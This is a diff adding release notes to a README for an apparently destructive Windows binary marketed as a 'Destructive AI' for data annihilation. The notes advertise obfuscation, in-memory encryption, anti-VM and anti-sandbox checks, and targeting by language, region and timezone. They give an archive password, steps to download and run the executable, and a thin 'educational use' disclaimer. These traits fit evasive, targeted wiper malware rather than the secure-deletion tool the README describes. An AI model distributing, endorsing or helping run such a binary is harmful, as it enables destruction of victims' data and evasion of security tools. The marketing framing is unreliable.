@@ -1,3 +1,30 @@
+### The First Standalone Artifact 🚀
+
+This release contains the fully compiled, obfuscated, and packed binary of the **Bangsaen Black Hole: Thanos Edition**.
+
+**🔥 Key Features in this Build:**
+* Standalone Windows Executable (No Flutter/Dart SDK required).
+* Native C++ Core (`native_core.dll`) with In-Memory XOR Encryption.
+* Hardware-level Anti-VM/Anti-Sandbox detection.
+* 3-Layer Environmental Targeting (UI Lang, Region, Timezone).
+* Self-Destruct Registry Stamping.
+
+---
+
+### ⚠️ IMPORTANT WARNING & EXTRACTION
+This is a live Proof of Concept demonstrating destructive behaviors. Your Antivirus/EDR **will** likely flag it. 
+
+🔒 **Archive Password:** `snap`
+
+**Instructions:**
+1. Download `BangsaenBlackHole_Thanos_v1.0.0.zip`
+2. Extract using 7-Zip or WinRAR (Password: `snap`)
+3. Run `bangsaen_blackhole_thanos.exe` at your own risk.
+
+*By downloading this file, you agree to use it strictly for educational and research purposes.*
+
+---
+
 # 🕳️ Bangsaen Black Hole: The World's First "Destructive AI"
 
 **Why Generate when you can Annihilate?** While the world is obsessed with Generative AI creating endless data, enterprise security faces a massive, unspoken crisis: *How do you permanently destroy sensitive data?* Standard OS `Delete` commands or formatting only remove file pointers, leaving your binary data exposed on the disk for forensics recovery. **Bangsaen Black Hole** introduces the concept of **Mathematical Data Annihilation**.
